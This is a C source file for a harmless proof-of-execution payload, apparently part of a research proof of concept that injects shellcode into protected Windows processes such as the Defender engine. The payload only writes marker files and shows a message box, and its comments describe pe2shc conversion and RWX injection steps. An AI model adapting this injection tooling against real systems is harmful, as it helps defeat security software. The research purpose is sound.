/*
 * payload_pe2shc.c - benign proof-of-execution payload, built to be converted
 * by pe2shc (hasherezade's pe_to_shellcode) into self-loading shellcode.
 *
 * Unlike payload.c (a /FIXED, zero-import PIC blob), this one is a NORMAL PE:
 *   * it has an import table (kernel32/user32) - pe2shc's stub loads imports;
 *   * it has relocations (pe2shc REQUIRES them, and uses them to relocate);
 *   * the `paths[]` pointer array deliberately needs relocations.
 *
 * pe2shc appends a reflective-loader stub and makes the buffer runnable from its
 * first byte; the injector maps it (SEC_IMAGE), makes it RWX, and starts a
 * thread at the image base - the stub then loads imports/relocations/TLS and
 * jumps here.
 *
 * Build: with relocations (NOT /FIXED), no CRT (/ENTRY:payload_entry), e.g.
 *   cl /c /O2 /GS- payload_pe2shc.c
 *   link /NODEFAULTLIB /ENTRY:payload_entry /SUBSYSTEM:WINDOWS /DYNAMICBASE \
 *        kernel32.lib user32.lib /OUT:payload_pe2shc.exe payload_pe2shc.obj
 *
 * Keep it harmless - it only proves code ran inside the target.
 */

#include <windows.h>

#pragma comment(linker, "/ENTRY:payload_entry")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

/* Provide memset so a /NODEFAULTLIB link can't fail on a compiler intrinsic. */
#pragma function(memset)
void *memset(void *dst, int val, size_t len) {
    unsigned char *p = (unsigned char *)dst;
    while (len--) *p++ = (unsigned char)val;
    return dst;
}

/*
 * File-scope pointer array. Each entry is an ABSOLUTE address of a string, so
 * the linker must emit a base relocation for it - and, being initialised global
 * data, the optimiser can't fold these into RIP-relative LEAs (a local array
 * at /O2 would, leaving the PE with no relocations, which pe2shc rejects).
 */
static const char *const g_paths[3] = {
    "C:\\Users\\Public\\inject_proof.txt",
    "C:\\Windows\\Temp\\inject_proof.txt",
    "C:\\ProgramData\\inject_proof.txt",
};

void payload_entry(void) {
    char msg[80];
    DWORD pid = GetCurrentProcessId();
    wsprintfA(msg, "Injected into PID %lu (pe2shc)", pid);
    int len = lstrlenA(msg);

    for (int i = 0; i < 3; i++) {
        HANDLE h = CreateFileA(g_paths[i], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteFile(h, msg, (DWORD)len, &written, NULL);
            CloseHandle(h);
        }
    }

    /* MB_SERVICE_NOTIFICATION routes the box to the active console session's
     * desktop, so it can show even when the payload runs in a Session-0 service
     * (e.g. MsMpEng). It is best-effort from a PPL process - the marker files
     * above are the dependable proof of execution. */
    MessageBoxA(NULL, msg, "PPLSystem PoC (pe2shc)", MB_OK | MB_SERVICE_NOTIFICATION);
}
